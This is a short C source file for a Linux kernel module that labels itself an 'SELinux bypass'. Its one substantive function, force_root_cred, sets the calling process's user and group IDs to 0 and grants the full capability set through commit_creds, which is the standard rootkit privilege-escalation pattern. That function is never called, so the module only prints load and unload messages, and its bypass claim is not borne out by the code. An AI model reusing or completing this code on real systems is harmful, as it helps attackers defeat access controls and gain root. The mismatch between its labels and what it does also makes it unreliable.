#include <linux/module.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/capability.h>

#define TAG "HuiJuiSELinux: "

static void __maybe_unused force_root_cred(void) {
    struct cred *new = prepare_creds();
    if (!new) return;
    new->uid.val = 0; new->gid.val = 0;
    new->euid.val = 0; new->egid.val = 0;
    new->cap_effective = CAP_FULL_SET;
    commit_creds(new);
    pr_info(TAG "Credential escalated.\n");
}

static int __init huijui_selinux_init(void) {
    pr_info(TAG "SELinux bypass loaded\n");
    return 0;
}

static void __exit huijui_selinux_exit(void) {
    pr_info(TAG "SELinux bypass unloaded\n");
}
module_init(huijui_selinux_init);
module_exit(huijui_selinux_exit);
MODULE_LICENSE("GPL");
